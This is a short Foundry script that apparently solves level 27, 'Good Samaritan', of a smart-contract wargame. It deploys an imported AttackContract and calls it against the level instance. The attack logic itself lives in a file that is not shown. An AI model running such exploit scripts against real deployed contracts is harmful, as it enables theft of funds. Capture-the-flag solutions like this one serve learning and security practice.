// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level27.sol";

// ================================================================
// │                    LEVEL 27 - GOOD SAMARITAN                 │
// ================================================================
interface IGoodSamaritan {
    function coin() external view returns (address coinAddress);
}

interface ICoin {
    function balances(address account) external view returns (uint256);
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        AttackContract attackContract = new AttackContract();
        attackContract.callGoodSamaritan(targetContractAddress);
        vm.stopBroadcast();
    }
}
